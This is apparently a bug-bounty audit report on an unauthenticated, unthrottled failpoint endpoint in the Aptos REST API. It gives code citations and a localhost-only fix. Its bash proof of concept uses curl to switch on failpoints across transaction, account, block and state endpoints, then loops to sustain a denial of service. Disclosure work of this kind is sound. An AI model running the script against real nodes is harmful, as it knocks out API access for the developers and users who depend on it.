# Audit Report

## Title
Unauthenticated Failpoint Activation Endpoint Lacks Rate Limiting, Enabling Sustained API Denial of Service

## Summary
The `/v1/set_failpoint` API endpoint lacks rate limiting and authentication, allowing unprivileged attackers to repeatedly activate failpoints and cause sustained denial of service on nodes with failpoints enabled (testnets, devnets). Once configured, failpoints trigger errors in critical API endpoints, rendering the API completely unavailable. [1](#0-0) 

## Finding Description
The Aptos REST API exposes a `/v1/set_failpoint` endpoint for testing purposes that allows runtime configuration of failpoints through HTTP GET requests. This endpoint has three critical security weaknesses:

1. **No Rate Limiting**: The endpoint can be called unlimited times with no throttling mechanisms in place. The middleware stack only includes CORS, compression, size limits, panic handling, and logging - no rate limiting middleware exists. [2](#0-1) 

2. **No Authentication**: Any network client can access the endpoint without credentials or authorization checks. The only gate is a configuration flag check. [3](#0-2) 

3. **Global Impact**: Once a failpoint is activated via `fail::cfg()`, it affects ALL subsequent requests to the targeted API endpoint. Failpoints are strategically placed at the beginning of critical endpoints including transactions, accounts, blocks, state, and events. [4](#0-3) 

**Attack Path:**

1. Attacker discovers a node with `failpoints_enabled=true` (common on testnets/devnets)
2. Attacker sends: `GET /v1/set_failpoint?name=api::endpoint_get_transactions&actions=return`
3. The failpoint is configured to trigger on every call to the transactions endpoint
4. All subsequent requests to `/v1/transactions` return "Failpoint unexpected internal error"
5. Attacker repeats for multiple critical endpoints: `api::endpoint_get_accounts`, `api::endpoint_get_blocks`, `api::endpoint_state`, etc.
6. The entire API becomes unusable
7. Without rate limiting, automated scripts can sustain this attack indefinitely and reconfigure failpoints if operators attempt to disable them [5](#0-4) 

## Impact Explanation
This vulnerability falls under **High Severity** per Aptos bug bounty criteria: "API crashes" (up to $50,000). 

The impact includes:
- **Complete API Unavailability**: All major API endpoints can be forced to fail, preventing access to blockchain data
- **Testnet/Devnet Disruption**: While mainnet is protected by config sanitization, testnets and devnets serve real developers and users who depend on API availability
- **Development Interference**: Attackers can disrupt legitimate testing, chaos engineering, and development workflows
- **No Recovery Without Restart**: Once failpoints are set, they persist until explicitly disabled or the node restarts [6](#0-5) 

While mainnet is protected, the vulnerability breaks the "Resource Limits: All operations must respect gas, storage, and computational limits" invariant by allowing unlimited failpoint configuration requests without any throttling.

## Likelihood Explanation
**High Likelihood** - The attack is trivial to execute:
- Requires only basic HTTP GET requests
- No authentication bypass needed
- No special privileges required
- Failpoints are commonly enabled on testnets for testing purposes
- Attack tools can be written in minutes
- Multiple failpoint targets maximize disruption

The only barrier is finding a node with `failpoints_enabled=true`, which is standard for test environments.

## Recommendation
Implement multiple layers of protection:

1. **Add Rate Limiting**: Implement per-IP rate limiting on the `/v1/set_failpoint` endpoint (e.g., 10 requests per minute)

2. **Add Authentication**: Require authentication tokens or restrict access to localhost only:
```rust
// In api/src/set_failpoints.rs
#[cfg(feature = "failpoints")]
#[handler]
pub fn set_failpoint_poem(
    context: Data<&std::sync::Arc<Context>>,
    Query(failpoint_conf): Query<FailpointConf>,
    remote_addr: &RemoteAddr,
) -> poem::Result<String> {
    // Restrict to localhost only
    if !remote_addr.0.ip().is_loopback() {
        return Err(poem::Error::from(anyhow::anyhow!(
            "Failpoint endpoint only accessible from localhost"
        )));
    }
    
    if context.failpoints_enabled() {
        fail::cfg(&failpoint_conf.name, &failpoint_conf.actions)
            .map_err(|e| poem::Error::from(anyhow::anyhow!(e)))?;
        info!(
            "Configured failpoint {} to {}",
            failpoint_conf.name, failpoint_conf.actions
        );
        Ok(format!("Set failpoint {}", failpoint_conf.name))
    } else {
        Err(poem::Error::from(anyhow::anyhow!(
            "Failpoints are not enabled at a config level"
        )))
    }
}
```

3. **Add Request Logging**: Log all failpoint configuration attempts with source IPs for monitoring

4. **Consider Separate Port**: Expose failpoint endpoints on a separate administrative port that can be firewalled

## Proof of Concept
```bash
#!/bin/bash
# Proof of Concept: Sustained API DoS via Failpoint Abuse
# Target: Aptos node with failpoints_enabled=true (e.g., testnet)

TARGET="http://testnet-node:8080"

# Attack: Configure multiple failpoints to crash critical endpoints
echo "[+] Activating failpoints on critical API endpoints..."

# Crash transaction endpoints
curl -s "$TARGET/v1/set_failpoint?name=api::endpoint_get_transactions&actions=return"
curl -s "$TARGET/v1/set_failpoint?name=api::endpoint_transaction_by_hash&actions=return"
curl -s "$TARGET/v1/set_failpoint?name=api::endpoint_transaction_by_version&actions=return"

# Crash account endpoints  
curl -s "$TARGET/v1/set_failpoint?name=api::endpoint_get_account&actions=return"
curl -s "$TARGET/v1/set_failpoint?name=api::endpoint_get_account_resources&actions=return"

# Crash block endpoints
curl -s "$TARGET/v1/set_failpoint?name=api::endpoint_get_block_by_height&actions=return"
curl -s "$TARGET/v1/set_failpoint?name=api::endpoint_get_block_by_version&actions=return"

# Crash state endpoints
curl -s "$TARGET/v1/set_failpoint?name=api::endpoint_get_table_item&actions=return"

echo "[+] Failpoints activated. Testing API availability..."

# Verify API is now unusable
echo "[+] Testing /v1/transactions endpoint..."
curl -v "$TARGET/v1/transactions" 2>&1 | grep -i "failpoint"

echo "[+] Testing /v1/accounts endpoint..."  
curl -v "$TARGET/v1/accounts/0x1" 2>&1 | grep -i "failpoint"

echo "[+] API is now in sustained DoS state"
echo "[+] Attacker can continuously reconfigure to prevent recovery"

# Sustain attack by reconfiguring every 10 seconds
while true; do
    sleep 10
    curl -s "$TARGET/v1/set_failpoint?name=api::endpoint_get_transactions&actions=return"
    echo "[+] Failpoints refreshed at $(date)"
done
```

**Expected Result**: All API endpoints return 500 Internal Server Error with "Failpoint unexpected internal error" messages, rendering the API completely unusable until manual intervention (node restart or failpoint disabling).

### Citations

**File:** api/src/runtime.rs (L248-251)
```rust
                    .at(
                        "/set_failpoint",
                        poem::get(set_failpoints::set_failpoint_poem).data(context.clone()),
                    ),
```

**File:** api/src/runtime.rs (L253-259)
```rust
            .with(cors)
            .with_if(config.api.compression_enabled, Compression::new())
            .with(PostSizeLimit::new(size_limit))
            .with(CatchPanic::new().with_handler(panic_handler))
            // NOTE: Make sure to keep this after all the `with` middleware.
            .catch_all_error(convert_error)
            .around(middleware_log);
```

**File:** api/src/set_failpoints.rs (L23-39)
```rust
pub fn set_failpoint_poem(
    context: Data<&std::sync::Arc<Context>>,
    Query(failpoint_conf): Query<FailpointConf>,
) -> poem::Result<String> {
    if context.failpoints_enabled() {
        fail::cfg(&failpoint_conf.name, &failpoint_conf.actions)
            .map_err(|e| poem::Error::from(anyhow::anyhow!(e)))?;
        info!(
            "Configured failpoint {} to {}",
            failpoint_conf.name, failpoint_conf.actions
        );
        Ok(format!("Set failpoint {}", failpoint_conf.name))
    } else {
        Err(poem::Error::from(anyhow::anyhow!(
            "Failpoints are not enabled at a config level"
        )))
    }
```

**File:** api/src/failpoint.rs (L14-23)
```rust
pub fn fail_point_poem<E: InternalError>(name: &str) -> Result<(), E> {
    fail::fail_point!(format!("api::{}", name).as_str(), |_| {
        Err(E::internal_with_code_no_info(
            format!("Failpoint unexpected internal error for {}", name),
            AptosErrorCode::InternalError,
        ))
    });

    Ok(())
}
```

**File:** api/src/transactions.rs (L169-169)
```rust
        fail_point_poem("endpoint_get_transactions")?;
```

**File:** config/src/config/api_config.rs (L177-185)
```rust
        // Verify that failpoints are not enabled in mainnet
        if let Some(chain_id) = chain_id {
            if chain_id.is_mainnet() && api_config.failpoints_enabled {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "Failpoints are not supported on mainnet nodes!".into(),
                ));
            }
        }
```
